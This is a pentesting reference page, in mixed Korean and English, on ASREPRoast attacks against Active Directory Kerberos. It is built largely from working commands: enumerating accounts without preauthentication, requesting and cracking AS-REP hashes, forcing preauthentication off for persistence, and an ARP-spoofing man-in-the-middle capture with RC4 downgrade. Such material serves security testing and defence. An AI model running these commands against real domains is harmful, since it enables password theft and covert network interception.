# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast는 **Kerberos pre-authentication required attribute**가 설정되지 않은 사용자를 노리는 보안 공격입니다. 본질적으로 이 취약점은 공격자가 사용자의 비밀번호 없이도 Domain Controller(DC)에 해당 사용자의 인증을 요청할 수 있게 합니다. DC는 이후 사용자 비밀번호에서 파생된 키로 암호화된 메시지로 응답하며, 공격자는 이를 오프라인에서 크랙하여 사용자의 비밀번호를 알아낼 수 있습니다.

The main requirements for this attack are:

- **Lack of Kerberos pre-authentication**: 대상 사용자는 이 보안 기능을 활성화하지 않아야 합니다.
- **Connection to the Domain Controller (DC)**: 공격자는 요청을 보내고 암호화된 메시지를 수신하기 위해 DC에 접근할 수 있어야 합니다.
- **Optional domain account**: 도메인 계정을 보유하면 공격자는 LDAP queries를 통해 취약한 사용자를 더 효율적으로 식별할 수 있습니다. 이러한 계정이 없으면 공격자는 사용자 이름을 추측해야 합니다.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP 메시지 요청
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus는 암호화 유형 0x17 및 preauth 유형 0을 가진 4768을 생성합니다.

#### 빠른 원라이너 (Linux)

- 우선 잠재적 대상들을 열거하세요 (e.g., from leaked build paths) with Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- 단일 사용자의 AS-REP을 **blank** 비밀번호로도 가져오려면 `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast`를 사용하세요 (netexec는 LDAP signing/channel binding posture도 출력합니다).
- `hashcat out.asreproast /path/rockyou.txt`로 크랙하세요 — AS-REP roast hashes에 대해 **-m 18200** (etype 23)을 자동으로 감지합니다.

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### 지속성

해당 사용자에 대해 **GenericAll** 권한(또는 속성 쓰기 권한)이 있는 경우 **preauth** 불필요로 설정(강제):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast 자격증명 없이

공격자는 man-in-the-middle 위치를 이용해 네트워크를 통과하는 동안 AS-REP 패킷을 캡처할 수 있으며, Kerberos pre-authentication이 비활성화되어 있어야 한다는 조건에 의존하지 않습니다. 따라서 VLAN의 모든 사용자에게 작동합니다.\  
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) allows us to do so. Moreover, the tool forces client workstations to use RC4 by altering the Kerberos negotiation.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## 참고자료

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
